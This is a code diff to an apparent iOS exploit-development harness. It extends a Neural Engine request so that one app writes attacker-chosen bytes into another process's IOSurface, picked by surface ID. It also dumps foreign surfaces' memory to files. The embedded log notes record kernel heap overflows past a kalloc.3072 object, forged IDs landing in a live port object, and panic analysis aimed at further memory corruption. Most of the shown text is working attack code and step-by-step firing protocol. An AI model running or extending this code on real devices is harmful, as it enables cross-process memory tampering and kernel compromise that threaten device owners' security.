@@ -154,7 +154,7 @@
 #import <math.h>
 #import <objc/message.h>
 
-#define P044_BUILD @"p044-v61d-census4k"
+#define P044_BUILD @"p044-v62-target-fill-forensics"
 
 #define INPUT_COUNT 191
 #define PAYLOAD_SIZE 0xb80
@@ -318,6 +318,27 @@ static void p044_write_log(NSString *out) {
     }
 }
 
+/* v62: POSIX bin sidecar writer (pulled via the house_arrest file lane).
+   O_TRUNC whole-file rewrite, F_FULLFSYNC — same durability contract as
+   p044_write_log. Used for census forensics + file-target pre-fire dump. */
+static void p044_write_bin(NSString *name, const uint8_t *bytes, size_t len) {
+    if (!name || !bytes || !len) return;
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSString *path = [docs stringByAppendingPathComponent:name];
+    int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
+    if (fd >= 0) {
+        size_t off = 0;
+        while (off < len) {
+            ssize_t w = write(fd, bytes + off, len - off);
+            if (w <= 0) break;
+            off += (size_t)w;
+        }
+        fcntl(fd, F_FULLFSYNC);
+        close(fd);
+    }
+}
+
 #pragma mark - Payload / port / message helpers
 
 static void fill_payload(uint8_t *p, uint32_t index, uint32_t role) {
@@ -463,6 +484,25 @@ static int      g_foreignDiff;     /* bytes changed post-fire (full 0x4000) */
 static int      g_foreignLockRc;   /* lock rc of the post-fire read */
 static double   g_expectedSum;     /* v59: CoreML-lane expected sum, for output-match scan */
 
+/* v62 file-driven overrides (app Documents, consumed on read — one file =
+   one deliberate fire, same contract as p044_req_in.txt):
+   p044_target.txt  — decimal IOSurfaceGetID of the target surface (the
+                      LC-guest loop hands us its own GetID here);
+   p044_fill.txt    — hex u16 fp16 tile (e.g. 4141); every staged A input is
+                      tile-filled so the min model's output = exactly this
+                      u16 written at the target base (chosen-content write). */
+static uint32_t p044TargetSidOverride;
+static int      p044FillTileValid;
+static uint16_t p044FillTile;
+
+/* v62 GUEST-HOLD state (session-persistent — deliberately NOT reset by
+   cls_reset; the guest app must hold its magic surface alive across taps
+   while backgrounded. Dies only with the process. */
+static CFTypeRef g_guestHold;
+static uint32_t  g_guestHoldSid;
+static uint16_t  g_guestHoldTile;
+static int       g_guestPreValid;
+
 /* v48.1 _ANEClient lane state (file scope so cleanup can always release) */
 static id g_aneModelObj = nil;
 static id g_aneClient = nil;
@@ -482,6 +522,8 @@ static void cls_reset(void) {
     g_foreignSnapValid = 0; g_foreignDiff = 0; g_foreignLockRc = -1;
     memset(g_foreignSnap, 0, sizeof(g_foreignSnap));
     g_expectedSum = NAN;
+    p044TargetSidOverride = 0;
+    p044FillTileValid = 0; p044FillTile = 0;
 }
 
 static void kptr_scan(uint8_t *buf, uint32_t victim, NSMutableString *out) {
@@ -834,6 +876,24 @@ static int p044_ane_build_request(NSMutableString *out) {
             [out appendFormat:@"  input surface %u create failed\n", i];
             return 0;
         }
+        if (p044FillTileValid) {
+            /* v62 CHOSEN-VALUE FILL: overwrite the whole input with the 2-byte
+               fp16 tile T (LE). Uniform tile => min(model) output = exactly T
+               at the output base => the sid-write carries CHOSEN content.
+               Without the file, the 0x41..0x50 byte fill stays (its fp16 min
+               0x4141 was the 128-fire's proven output). */
+            if (p044_sfLock(s, 0, NULL) == 0) {
+                uint8_t *b = (uint8_t *)p044_sfBase(s);
+                size_t n = p044_sfAllocSz(s);
+                if (b && n) {
+                    for (size_t o = 0; o + 1 < n; o += 2) {
+                        b[o] = (uint8_t)(p044FillTile & 0xff);
+                        b[o + 1] = (uint8_t)(p044FillTile >> 8);
+                    }
+                }
+                p044_sfUnlock(s, 0, NULL);
+            }
+        }
         uint32_t sid = p044_sfGetID(s);
         if (g_nSurf < 1024u) {
             g_surfs[g_nSurf++] = s;
@@ -878,6 +938,8 @@ static int p044_ane_build_request(NSMutableString *out) {
             for (uint32_t k = 0; k < g_nSurf; k++) {
                 if (g_surfs[k] && CFEqual(g_surfs[k], f)) { aliased = 1; break; }
             }
+            /* v62: held guest surface alias guard (same rationale as census) */
+            if (!aliased && g_guestHold && CFEqual(g_guestHold, f)) aliased = 1;
             if (aliased) {
                 [out appendFormat:@"  [v57] SID ALIAS: sid %u now resolves to one of OUR "
                                   @"surfaces (re-created post-census) — lane dropped, own output\n",
@@ -887,7 +949,18 @@ static int p044_ane_build_request(NSMutableString *out) {
             } else {
             uint32_t fsid = p044_sfGetID ? p044_sfGetID(f) : g_foreignOutSid;
             size_t fsz = p044_sfAllocSz ? p044_sfAllocSz(f) : 0;
-            if (fsz != 0 && fsz != P044_REQ_OUT_BYTES) {
+            if (p044TargetSidOverride && fsid != p044TargetSidOverride) {
+                /* v62: the guest handed us ITS GetID; lookup(arg) resolved a
+                   surface with a DIFFERENT id — the id spaces are NOT one
+                   round-trip (matches the 128-fire 310→312535552 anomaly).
+                   Arming now would write a stranger's surface while we claim
+                   the guest's. Honesty: drop the lane; the round-trip line in
+                   the census tells us what the space really is. */
+                [out appendFormat:@"  [v62] FILE-TARGET round-trip BROKEN: arg=%u resolved GetID=%u — lane dropped (no honest aim at the guest surface)\n",
+                    p044TargetSidOverride, fsid];
+                CFRelease(f);
+                g_foreignOutSid = 0;
+            } else if (fsz != 0 && fsz != P044_REQ_OUT_BYTES) {
                 [out appendFormat:@"  [v57] sid %u size changed %zu → own output fallback "
                                   @"(consumer validates size; not our 0x4000 target)\n",
                     fsid, fsz];
@@ -897,7 +970,15 @@ static int p044_ane_build_request(NSMutableString *out) {
                 /* v57: refresh pre-fire snapshot + useCount at arm time */
                 if (p044_sfLock(f, 1, NULL) == 0) {
                     uint8_t *b = (uint8_t *)p044_sfBase(f);
-                    if (b) { memcpy(g_foreignSnap, b, sizeof(g_foreignSnap)); g_foreignSnapValid = 1; }
+                    if (b) {
+                        memcpy(g_foreignSnap, b, sizeof(g_foreignSnap)); g_foreignSnapValid = 1;
+                        /* v62: file-target pre-fire FULL dump — the guest-loop
+                           oracle pairs with this (guest re-reads post-fire). */
+                        if (p044TargetSidOverride) {
+                            p044_write_bin(@"p044_target_pre.bin", b, sizeof(g_foreignSnap));
+                            [out appendString:@"  [v62] pre-fire full dump -> Documents/p044_target_pre.bin\n"];
+                        }
+                    }
                     p044_sfUnlock(f, 1, NULL);
                 }
                 g_foreignUsePre = p044_sfUseCount ? p044_sfUseCount(f) : 0;
@@ -1695,6 +1776,7 @@ static void *watch_worker(void *arg) {
     [out appendString:@"v56 smallgeo+lane+stillness (notes 126/127): panic pack proved CheckandPrewire marshals into a FIXED 192-record kalloc.3072 object — 255-entry requests spill records 192+ ([sid][flag][1][1], flag 0xc0..0xfe sequential); the Oct-6 20:28 abort was entry #193 str'ing past a page-terminating element (x25+0xC00==far), and 3 MAF panics dumped the same record stream in kalloc.3072/1536/32. So 0xe00002c2 = kIOReturnBadArgument is the arg check, not budget. v56: REQ_IN_BYTES 602112→0x4000 (size-validation vs arg-check test), MIL handle==0 retries the mlmodelc URL + v54 transport so the direct lane arms, and the census target is stillness-checked (1.2 s re-diff — movers are own CoreML/Siri staging, the 6f false positive). Sid-band re-read: census 'foreign' band = OUR OWN staging surfaces; output-sid lane story closed.\n"];
     [out appendString:@"v57 sidreval (note 129 risk + 130 plan): staged sids 161..878 overlap the census band 162–610, and the out target is picked PRE-CREATION — if the picked surface dies before the build, a NEW surface (ours or system) inherits its sid and the lane silently writes OUR memory. v57 re-validates the lane AFTER all surfaces are created: resolved object must not CFEqual any of our staged surfaces, size must still be 0x4000, and the pre-fire snapshot + useCount are re-taken at arm time so the pre/post diff measures only the fire. Look for [v57] OUTPUT-SID LANE ARMED (clean) vs [v57] SID ALIAS (dropped — census target was recycled). Also next run: capture the KERNEL log during the fire — 'MemoryMapRequest for 255 buffers, result: 0xe00002c2' printing for OUR request decides marshaling-count vs sid-validation as the 0x2/0x9 reject (note 130).\n"];
     [out appendString:@"v58 sweep scaffold (note 130 Phase K1): write N to /var/mobile/Documents/p044_req_in.txt (one line) before tapping P044 — this tap fires with N inputs instead of 254 and the file is consumed (one file = one deliberate fire, no persistence across force-quits). Sweep protocol: N = 193, 196, 200, 224, 255; (N-192) = records CheckandPrewire writes PAST kalloc.3072. Goal: max N that completes without panic + kernel-log capture each run. With N != 254 the out-entry moves off symbolIndex 254 / body+0x444 — the pattern scan ({outSid,0,1,2}) still finds it.\n"];
+    [out appendString:@"v62 closed-loop scaffold (note 161 follow-up): three new app-Documents files, ALL consumed on read — (1) p044_target.txt = decimal IOSurfaceGetID of the surface that receives the ANE output (LC-guest loop: guest writes its own GetID here); (2) p044_fill.txt = hex u16 fp16 tile (e.g. 4141) — every A input is tile-filled so the min model's output = exactly this u16 at the target base (CHOSEN content); (3) forensics sidecars now written automatically: p044_census_<sid>.bin (full 16384 B of each 0x4000 foreign hit, cap 12) + p044_target_pre.bin (file-target pre-fire full dump). New round-trip diagnostics: [for] lines now log rt=GetID(lookup(arg)) — the 128-fire 310→312535552 anomaly gets settled this tap; if the file target's round-trip is broken the lane DROPS (no honest aim). GUEST-LOOP PROTOCOL (single binary, two installs): GUEST install — push p044_guest.txt to ITS Documents, tap once = GUEST HOLD (surface tiled 0x4B1D created + held; sid in log; keep app background-alive); pull that sid, push as p044_target.txt into the STANDALONE app along with p044_fill.txt=<different tile e.g. 5eaf> + p044_req_in.txt=127 + p044_model.txt=<min model>, tap standalone = the fire; STANDALONE evidence: p044_target_pre.bin must show the guest's magic tile at that sid (round-trip gate must pass); GUEST observe — tap the guest again with p044_guest.txt: p044_guest_after.bin + base u16 != pre-tile at base with rest still uniform = CROSS-PROCESS CHOSEN-CONTENT WRITE proven.\n"];
     [out appendString:@"v60 passthrough (Oct-12 20:23): XVRC27_254in_passthrough — same fire, same OUTPUT-SID lane, same census/stillness/out-entry scan; ONLY the model changes (addchain -> passthrough). The 23F77 reject (status=0x2 statusType=0x9 Program Inference error) + the rig's pred=FAILED (accepted, only the 2-byte 0x6a58 header landed) are split by this run: program-complexity cause -> ACCEPTED here (fill + foreign write in ONE fire on 23F77); input-count cause -> rejected again (next vehicle = B model 127in + 1out = 128 records, NO overflow, inference proven to complete on 23F77 y=613 — the foreign OUTPUT sid rides the in-bounds OUTPUT record through the size/symbol gates). Oracles: foreign full-surface pre/post diff + useCount + OUR input fill pattern (0x41..0x50 words) in the foreign surface = OUR content in THEIR memory + sidecar p044_outdump.bin.\n"];
     [out appendString:@"v49 outcome (09:41): BAR HALF ONE PASSED - 62 forged sids {870..931, 0xc0..0xfd} received back from a LIVE port-kind victim at body+0x64..0x434 = exactly the tile end. Fill starts at victim body+0x64; desc-region forge (copyout reject) is the same landing 0x48 earlier. Field-window math (note 118 s3): type==0 never forms from {sid,0xcN,1,1}; desc conversion needs a different record pattern - the consume path is the door.\n"];
     [out appendString:@"Oct-2 panic pack: record area = dedicated kalloc.3072 (192x16); GZAlloc guard abort (pc=+0x18C store) and modified-after-free are the two freed-lane failure modes. Hole lane CLOSED.\n"];
@@ -1737,6 +1819,140 @@ static void *watch_worker(void *arg) {
                 [out appendFormat:@"  [v58] p044_req_in.txt present but N=%u out of range 2..4096 — default 191 kept\n", n];
             }
             unlink(sweepPath.fileSystemRepresentation);
+        }
+    }
+
+    /* v62 TARGET loader: app Documents/p044_target.txt, one decimal line =
+       the IOSurfaceGetID of the surface to receive the ANE output (the
+       LC-guest closed loop writes its own GetID here; we pull the file via
+       house_arrest). Consumed on read. Range 1..0xfffffffe. */
+    {
+        NSString *tgtDocs = NSSearchPathForDirectoriesInDomains(
+            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+        NSString *tgtPath = [tgtDocs stringByAppendingPathComponent:@"p044_target.txt"];
+        NSString *s = [NSString stringWithContentsOfFile:tgtPath
+                                                encoding:NSUTF8StringEncoding error:NULL];
+        if (s) {
+            NSCharacterSet *nonDigits = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
+            NSString *digits = [[s componentsSeparatedByCharactersInSet:nonDigits]
+                                  componentsJoinedByString:@""];
+            uint32_t t = (uint32_t)strtoul(digits.UTF8String, NULL, 10);
+            if (t >= 1) {
+                p044TargetSidOverride = t;
+                [out appendFormat:@"  [v62] TARGET OVERRIDE=%u (from app Documents/p044_target.txt; file consumed — LC-guest loop)\n", t];
+            } else {
+                [out appendString:@"  [v62] p044_target.txt present but no usable id — census pick kept\n"];
+            }
+            unlink(tgtPath.fileSystemRepresentation);
+        }
+    }
+
+    /* v62 FILL-TILE loader: app Documents/p044_fill.txt, one hex u16 = the
+       fp16 tile (e.g. "4141" or "0x4141"). Every staged A input surface is
+       re-filled with this 2-byte tile (LE) after create — uniform tile T
+       makes the min model's output = exactly T at the target base. Chosen
+       CONTENT for the sid-write. Consumed on read. */
+    {
+        NSString *flDocs = NSSearchPathForDirectoriesInDomains(
+            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+        NSString *flPath = [flDocs stringByAppendingPathComponent:@"p044_fill.txt"];
+        NSString *s = [NSString stringWithContentsOfFile:flPath
+                                                encoding:NSUTF8StringEncoding error:NULL];
+        if (s) {
+            NSString *hex = [[s componentsSeparatedByCharactersInSet:
+                [[NSCharacterSet alphanumericCharacterSet] invertedSet]]
+                componentsJoinedByString:@""];
+            if ([hex.lowercaseString hasPrefix:@"0x"]) hex = [hex substringFromIndex:2];
+            uint32_t v = (uint32_t)strtoul(hex.UTF8String, NULL, 16);
+            if (hex.length >= 1 && hex.length <= 4 && v <= 0xffff) {
+                p044FillTile = (uint16_t)v;
+                p044FillTileValid = 1;
+                [out appendFormat:@"  [v62] FILL TILE=0x%04x (from app Documents/p044_fill.txt; file consumed — chosen fp16 output)\n", p044FillTile];
+            } else {
+                [out appendString:@"  [v62] p044_fill.txt present but not a u16 hex tile — default 0x41..0x50 fill kept\n"];
+            }
+            unlink(flPath.fileSystemRepresentation);
+        }
+    }
+
+    /* v62 GUEST-HOLD mode: Documents/p044_guest.txt present = this install
+       acts as the LC-gUEST of the closed loop (same IPA, second install).
+       HOLD tap (1st): consume file; create ONE 0x4000 surface, tile it with
+       the FILL tile (p044_fill.txt, default 0x4B1D), hold it in g_guestHold
+       (NOT g_surfs — cleanup must not release it), log GUEST HOLD SID, dump
+       p044_guest_pre.bin, early-return. Keep the app backgrounded.
+       OBSERVE tap (2nd, same process): read-only dump -> p044_guest_after.bin,
+       base u16 vs tile, uniformity check, release. If the process died in
+       between, g_guestHold is NULL -> fresh hold (log says so). */
+    {
+        NSString *gDocs = NSSearchPathForDirectoriesInDomains(
+            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+        NSString *gPath = [gDocs stringByAppendingPathComponent:@"p044_guest.txt"];
+        NSString *gs = [NSString stringWithContentsOfFile:gPath
+                                                 encoding:NSUTF8StringEncoding error:NULL];
+        if (gs) {
+            unlink(gPath.fileSystemRepresentation);
+            if (g_guestHold) {
+                uint16_t tile = g_guestHoldTile;
+                [out appendFormat:@"\n=== v62 GUEST OBSERVE: held sid=%u pre-tile=0x%04x ===\n",
+                    g_guestHoldSid, tile];
+                if (p044_sfLock(g_guestHold, 1, NULL) == 0) {
+                    uint8_t *b = (uint8_t *)p044_sfBase(g_guestHold);
+                    if (b) {
+                        p044_write_bin(@"p044_guest_after.bin", b, P044_REQ_OUT_BYTES);
+                        uint16_t w0 = (uint16_t)(b[0] | (b[1] << 8));
+                        [out appendFormat:@"  base u16=0x%04x (pre tile 0x%04x) bytes0..7=%02x %02x %02x %02x %02x %02x %02x %02x\n",
+                            w0, tile, b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]];
+                        int uniform = 1;
+                        for (size_t o = 2; o + 1 < P044_REQ_OUT_BYTES && uniform; o += 2)
+                            if (b[o] != (uint8_t)(tile & 0xff) || b[o + 1] != (uint8_t)(tile >> 8))
+                                uniform = 0;
+                        [out appendFormat:@"  rest-of-surface still uniform-tile=%@ (base-only change = the 2-byte min write signature)\n",
+                            uniform ? @"YES" : @"NO"];
+                        g_guestPreValid = 1;
+                    }
+                    p044_sfUnlock(g_guestHold, 1, NULL);
+                } else {
+                    [out appendString:@"  held surface lock FAILED — surface dead?\n"];
+                }
+                CFRelease(g_guestHold);
+                g_guestHold = NULL; g_guestHoldSid = 0;
+                p044_write_log(out);
+                return out;
+            }
+            uint16_t tile = p044FillTileValid ? p044FillTile : 0x4b1d;
+            CFTypeRef srf = p044_surface_create_poc(P044_REQ_OUT_BYTES, (uint8_t)(tile & 0xff));
+            if (!srf) {
+                [out appendString:@"  [v62 GUEST] hold surface create failed\n"];
+                p044_write_log(out);
+                return out;
+            }
+            if (p044_sfLock(srf, 0, NULL) == 0) {
+                uint8_t *b = (uint8_t *)p044_sfBase(srf);
+                size_t n = p044_sfAllocSz(srf);
+                if (b && n)
+                    for (size_t o = 0; o + 1 < n; o += 2) {
+                        b[o] = (uint8_t)(tile & 0xff);
+                        b[o + 1] = (uint8_t)(tile >> 8);
+                    }
+                p044_sfUnlock(srf, 0, NULL);
+            }
+            g_guestHold = srf;
+            g_guestHoldSid = p044_sfGetID ? p044_sfGetID(srf) : 0;
+            g_guestHoldTile = tile;
+            [out appendFormat:@"\n=== v62 GUEST HOLD: sid=%u tile=0x%04x (LE %02x %02x x8192) ===\n",
+                g_guestHoldSid, tile, tile & 0xff, tile >> 8];
+            [out appendString:@"  KEEP THIS APP BACKGROUND-ALIVE (no force-quit — the surface dies with the process). Push this sid as p044_target.txt into the STANDALONE app's Documents (house_arrest), push p044_fill.txt with a DIFFERENT tile there (e.g. 5eaf) + p044_req_in.txt=127 + p044_model.txt=min model, tap the STANDALONE, then return here and tap with p044_guest.txt again to observe. p044_guest_pre.bin written.\n"];
+            if (p044_sfLock(srf, 1, NULL) == 0) {
+                uint8_t *b = (uint8_t *)p044_sfBase(srf);
+                if (b) {
+                    p044_write_bin(@"p044_guest_pre.bin", b, P044_REQ_OUT_BYTES);
+                    g_guestPreValid = 1;
+                }
+                p044_sfUnlock(srf, 1, NULL);
+            }
+            p044_write_log(out);
+            return out;
         }
     }
 
@@ -1855,8 +2071,13 @@ static void *watch_worker(void *arg) {
         uint32_t ourSids[1024]; size_t nOur = 0;
         for (uint32_t k = 0; k < g_nSurf && nOur < 1024u; k++)
             if (g_surfs[k]) ourSids[nOur++] = p044_sfGetID(g_surfs[k]);
+        /* v62: a held guest surface is OURS too — never a census target
+           (the guest's own fire must not write its own held surface and
+           fake the cross-process oracle). */
+        if (g_guestHold && g_guestHoldSid && nOur < 1024u)
+            ourSids[nOur++] = g_guestHoldSid;
         uint32_t forFirst[8]; size_t nFirst = 0;
-        int foreignHits = 0, lookNull = 0;
+        int foreignHits = 0, lookNull = 0, censusDumps = 0;
         for (uint32_t sid = 1; sid <= 1200; sid++) {
             CFTypeRef f = p044_sfLookup(sid);
             if (!f) { lookNull++; continue; }
@@ -1866,7 +2087,30 @@ static void *watch_worker(void *arg) {
             if (!ours) {
                 foreignHits++;
                 size_t sz = p044_sfAllocSz ? p044_sfAllocSz(f) : 0;
-                [out appendFormat:@"  [for] sid=%u size=%zu\n", sid, sz];
+                /* v62 ROUND-TRIP probe: does lookup(arg)->GetID return the
+                   arg? The 128-fire saw census arg 310 resolve to a surface
+                   reported as GetID 312535552 — if the id spaces really
+                   differ, the file-target lane must trust GetID(f), not the
+                   arg. Logged for every 0x4000 hit (bounded). */
+                uint32_t rt = p044_sfGetID ? p044_sfGetID(f) : 0;
+                [out appendFormat:@"  [for] sid=%u size=%zu rt=%u%s\n", sid, sz, rt,
+                    rt == sid ? "" : "  <<< ROUND-TRIP BROKEN"];
+                /* v62 FORENSICS: full-content dump of every 0x4000-sized
+                   foreign hit (cap 12 files ≈ 192 KB) to Documents/
+                   p044_census_<sid>.bin — pulled via house_arrest and used to
+                   classify ownership (our 0x41..0x50 staging fills vs system
+                   content). Read-only lock, no sync, no writes to the surface. */
+                if (sz == P044_REQ_OUT_BYTES && censusDumps < 12) {
+                    if (p044_sfLock(f, 1, NULL) == 0) {
+                        uint8_t *b = (uint8_t *)p044_sfBase(f);
+                        if (b) {
+                            NSString *nm = [NSString stringWithFormat:@"p044_census_%u.bin", sid];
+                            p044_write_bin(nm, b, sz);
+                            censusDumps++;
+                        }
+                        p044_sfUnlock(f, 1, NULL);
+                    }
+                }
                 /* v61d: stillness candidates restricted to 0x4000-sized hits.
                    The Oct-16 17:25 tap wasted the pick on sid=18 (131072 B
                    staging, first hit, stable) and v57 then dropped it at
@@ -1886,6 +2130,15 @@ static void *watch_worker(void *arg) {
            false positive. Pick the first candidate byte-stable across a
            1.2 s read-only re-diff; movers are skipped (excludes live
            writers). Read-only lock (kIOSurfaceLockReadOnly=1) — no writes. */
+        if (p044TargetSidOverride) {
+            /* v62: file target wins — stillness pick skipped (the LC-guest
+               loop's target is chosen by the guest, not by us; stillness
+               can't be assumed for a live guest app). The v57 build-time
+               re-validation + the new round-trip check gate the lane. */
+            g_foreignOutSid = p044TargetSidOverride;
+            [out appendFormat:@"  [v62] OUT-SID TARGET=%u (file override — stillness pick skipped; census kept for forensics)\n",
+                g_foreignOutSid];
+        }
         for (size_t k = 0; k < nFirst && g_foreignOutSid == 0; k++) {
             uint32_t sid = forFirst[k];
             CFTypeRef f = p044_sfLookup(sid);
